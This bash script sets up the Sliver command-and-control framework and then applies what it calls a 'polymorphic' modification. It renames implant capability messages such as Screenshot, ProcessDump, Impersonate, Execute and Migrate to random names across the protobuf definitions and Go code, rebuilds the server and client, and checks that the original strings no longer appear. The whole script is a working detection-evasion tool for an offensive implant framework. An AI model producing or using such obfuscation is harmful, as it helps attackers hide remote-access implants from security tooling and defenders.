#!/bin/bash
set -e

echo "[*] Setting up Go, protobuf, and Sliver environment..."

# Step 1: Install Go and Git
sudo apt update
sudo apt install -y golang-go git

# Step 2: Install Go protobuf plugins
go install google.golang.org/protobuf/cmd/protoc-gen-go@latest
go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@latest

# Step 3: Ensure Go bin path is available
if [[ ":$PATH:" != *":$HOME/go/bin:"* ]]; then
  echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.bashrc
  export PATH=$PATH:$HOME/go/bin
  source ~/.bashrc
fi

# Step 4: Clone or update Sliver repo and checkout v1.5.43
if [ ! -d "$HOME/sliver" ]; then
  echo "[*] Cloning Sliver repository..."
  git clone https://github.com/BishopFox/sliver.git "$HOME/sliver"
fi

cd "$HOME/sliver"
echo "[*] Fetching tags and checking out Sliver v1.5.43..."
git fetch --tags
git checkout v1.5.43

echo "[+] Sliver v1.5.43 environment setup complete."





set -e

SLIVER_DIR="${1:-.}"

if [ ! -d "$SLIVER_DIR/protobuf" ]; then
    echo "Error: Sliver directory not found. Usage: $0 /path/to/sliver"
    exit 1
fi

cd "$SLIVER_DIR"

echo "[*] Starting polymorphic Sliver modification process..."
echo ""

# Backup first
if [ ! -d "protobuf.backup.original" ]; then
    echo "[*] Creating backup..."
    cp -r protobuf protobuf.backup.original
    echo "    Backup saved to protobuf.backup.original"
fi

echo ""
echo "[*] Generating polymorphic names..."

# Function to generate random string
generate_random() {
    cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 12 | head -n 1
}

# Polymorphic renames
declare -A PROTO_RENAMES
PROTO_RENAMES["ScreenshotReq"]="SysDLIXGBGAUFReq"
PROTO_RENAMES["Screenshot"]="SysCUTKTLWUZP"
PROTO_RENAMES["ProcessDumpReq"]="SysRHGQITVFORReq"
PROTO_RENAMES["ProcessDump"]="SysOFNZDAKFHA"
PROTO_RENAMES["ImpersonateReq"]="SysJKSNNDXSHEReq"
PROTO_RENAMES["Impersonate"]="SysPFHMDUOYDA"
PROTO_RENAMES["PsReq"]="SysGOFWGSTLZCReq"
PROTO_RENAMES["Ps"]="SysMCKWBNEGNT"
PROTO_RENAMES["IfconfigReq"]="SysCINOQQIAYJReq"
PROTO_RENAMES["Ifconfig"]="SysRMIEQRHYLD"
PROTO_RENAMES["NetstatReq"]="SysWTCMBYVUBOReq"
PROTO_RENAMES["Netstat"]="SysXPHPYJTUFR"
PROTO_RENAMES["LsReq"]="SysUBWXGXEWSDReq"
PROTO_RENAMES["Ls"]="SysWXTLYRADIS"
PROTO_RENAMES["CdReq"]="SysMUXCZDSWOMReq"
PROTO_RENAMES["Cd"]="SysJROGFJKACB"
PROTO_RENAMES["PwdReq"]="SysUZAZJFSWDSReq"
PROTO_RENAMES["Pwd"]="SysFAVJCPMMWT"
PROTO_RENAMES["MkdirReq"]="SysEBOVSOTDEXReq"
PROTO_RENAMES["Mkdir"]="SysPONBECHDKW"
PROTO_RENAMES["RmReq"]="SysRHDTMSXECJReq"
PROTO_RENAMES["Rm"]="SysQRJFDEKHFB"
PROTO_RENAMES["ExecuteReq"]="SysGHZPHLYDMXReq"
PROTO_RENAMES["Execute"]="SysIEEOLMZRQE"
PROTO_RENAMES["UploadReq"]="SysAVDHDZQYBIReq"
PROTO_RENAMES["Upload"]="SysGHCDTCBZHH"
PROTO_RENAMES["DownloadReq"]="SysSEIUDFLDRXReq"
PROTO_RENAMES["Download"]="SysUEPVIOYYWR"
PROTO_RENAMES["MigrateReq"]="SysYHXKSCADZXReq"
PROTO_RENAMES["Migrate"]="SysQYCBYORUYY"

# Apply renames to proto files
echo ""
echo "[*] Step 1: Modifying protobuf definitions..."
for OLD in "${!PROTO_RENAMES[@]}"; do
    NEW="${PROTO_RENAMES[$OLD]}"
    echo "  [+] Renaming proto: $OLD -> $NEW"
    find protobuf -name "*.proto" -type f -exec sed -i "s/\b${OLD}\b/${NEW}/g" {} \;
done

echo ""
echo "[*] Step 2: Regenerating protobuf files..."
make pb || {
    echo "ERROR: make pb failed. Restoring backup..."
    rm -rf protobuf
    cp -r protobuf.backup.original protobuf
    exit 1
}

echo ""
echo "[*] Step 3: Updating Go code references..."

# Phase 1: Update type references in all Go files (except generated)
FILES=$(find . -name "*.go" -type f ! -name "*.pb.go" ! -path "./vendor/*" ! -path "./.git/*")

for OLD in "${!PROTO_RENAMES[@]}"; do
    NEW="${PROTO_RENAMES[$OLD]}"
    echo "  [+] Updating Go references: $OLD -> $NEW"
    echo "$FILES" | xargs -I {} sed -i "s/\b${OLD}\b/${NEW}/g" {}
done

echo ""
echo "[*] Step 4: Fixing method call collisions..."

# Expanded collision fixes
echo "  [+] Restoring common method names..."
echo "$FILES" | xargs -I {} sed -i \
    -e 's/\.Sys[^ ]*Execute(/\.Execute(/g' \
    -e 's/tmpl\.Sys[^ ]*Execute/tmpl.Execute/g' \
    -e 's/template\.Sys[^ ]*Execute/template.Execute/g' \
    -e 's/cmd\.Sys[^ ]*Execute/cmd.Execute/g' \
    -e 's/root\.Sys[^ ]*Execute/root.Execute/g' \
    -e 's/command\.Sys[^ ]*Execute/command.Execute/g' \
    -e 's/\.Sys[^ ]*Upload(/\.Upload(/g' \
    -e 's/\.Sys[^ ]*Download(/\.Download(/g' \
    -e 's/reader\.Sys[^ ]*Upload/reader.Upload/g' \
    -e 's/writer\.Sys[^ ]*Upload/writer.Upload/g' \
    -e 's/reader\.Sys[^ ]*Download/reader.Download/g' \
    -e 's/writer\.Sys[^ ]*Download/writer.Download/g' \
    -e 's/os\.Sys[^ ]*Remove/os.Remove/g' \
    -e 's/filepath\.Sys[^ ]*Remove/filepath.Remove/g' \
    {}

# Fix RPC calls to use new names
echo "  [+] Fixing RPC method calls..."
for OLD in "${!PROTO_RENAMES[@]}"; do
    if [[ $OLD == *Req ]]; then
        RPC_OLD="${OLD%Req}"
        RPC_NEW="${PROTO_RENAMES[$OLD]%Req}"
        echo "    RPC: $RPC_OLD -> $RPC_NEW"
        echo "$FILES" | xargs -I {} sed -i \
            -e "s/\.Rpc\.${RPC_OLD}(/\.Rpc\.${RPC_NEW}(/g" \
            -e "s/rpc\.${RPC_OLD}(/rpc\.${RPC_NEW}(/g" \
            -e "s/client\.${RPC_OLD}(/client\.${RPC_NEW}(/g" \
            {}
    fi
done

echo ""
echo "[*] Step 5: Cleaning up and attempting compilation..."
go mod tidy || true

echo ""
if make; then
    echo ""
    echo "============================================"
    echo "SUCCESS! Modified Sliver compiled successfully!"
    echo "============================================"
    echo ""
    echo "Your binaries are ready:"
    ls -lh sliver-server sliver-client 2>/dev/null || echo "  Server: sliver-server"
    echo ""
    echo "To verify modifications:"
    echo "  strings sliver-server | grep -i 'ScreenshotReq'  # Should be empty"
    echo ""
    echo "Polymorphic names used (save these for reference):"
    for OLD in "${!PROTO_RENAMES[@]}"; do
        echo "  $OLD -> ${PROTO_RENAMES[$OLD]}"
    done
    echo ""
    echo "To start using:"
    echo "  ./sliver-server"
    echo ""
    echo "Original protobuf backup: protobuf.backup.original"
else
    echo ""
    echo "============================================"
    echo "Compilation failed. Let's debug..."
    echo "============================================"
    echo ""
    echo "The backup is still at: protobuf.backup.original"
    echo ""
    echo "To restore and try again:"
    echo "  rm -rf protobuf"
    echo "  cp -r protobuf.backup.original protobuf"
    echo ""
    echo "Common issues:"
    echo "  1. Some method names might still need manual fixing"
    echo "  2. Check the error output above for specific files/lines"
    echo "  3. You can manually edit those files and run 'make' again"
    echo "  4. Try running 'go mod tidy' manually"
    echo ""
    exit 1
fi
